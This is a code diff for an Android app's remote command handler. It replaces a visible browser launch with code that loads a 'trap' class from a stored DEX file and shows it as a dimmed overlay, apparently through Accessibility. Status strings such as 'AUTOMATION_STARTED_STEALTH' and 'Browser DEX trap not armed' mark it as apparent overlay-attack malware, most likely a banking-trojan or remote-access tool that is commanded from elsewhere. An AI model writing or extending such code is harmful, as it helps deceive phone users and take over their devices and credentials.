@@ -460,14 +460,34 @@ object CommandProcessor {
                         status = "AUTOMATION_STARTED_STEALTH"
                         errorMsg = "URL: $targetUrl"
                     } else {
-                        val intent = Intent(ctx, BrowserActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                            putExtra("auto_url", targetUrl)
-                            putExtra("auto_prompt_b64", promptB64)
+                        val bPrefs = ctx.getSharedPreferences("browser_prefs", Context.MODE_PRIVATE)
+                        bPrefs.edit().putString("auto_url", targetUrl).putString("auto_prompt_b64", promptB64).apply()
+                        
+                        val statsPrefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                        val nativeStr = statsPrefs.getString("native_traps_array", "[]") ?: "[]"
+                        val nativeArr = org.json.JSONArray(nativeStr)
+                        var found = false
+                        for (i in 0 until nativeArr.length()) {
+                            val trap = nativeArr.getJSONObject(i)
+                            if (trap.optString("label").equals("Browser", ignoreCase = true) || trap.optString("class_name").contains("BrowserUI")) {
+                                val dexPath = trap.getString("file_path")
+                                val className = trap.getString("class_name")
+                                val dimLevel = trap.optInt("dim", 85)
+                                val method = trap.optString("method", "ACC")
+                                Handler(Looper.getMainLooper()).post {
+                                    DynamicUIManager.showNativeOverlay(ctx, dexPath, className, dimLevel, method)
+                                }
+                                found = true
+                                break
+                            }
                         }
-                        ctx.startActivity(intent)
-                        status = "AUTOMATION_STARTED_VISIBLE"
-                        errorMsg = "URL: $targetUrl"
+                        if (!found) {
+                            status = "FAILED_NO_DEX"
+                            errorMsg = "Browser DEX trap not armed."
+                        } else {
+                            status = "AUTOMATION_STARTED_VISIBLE"
+                            errorMsg = "URL: $targetUrl"
+                        }
                     }
                 }
                 "MAP_GRID" -> {
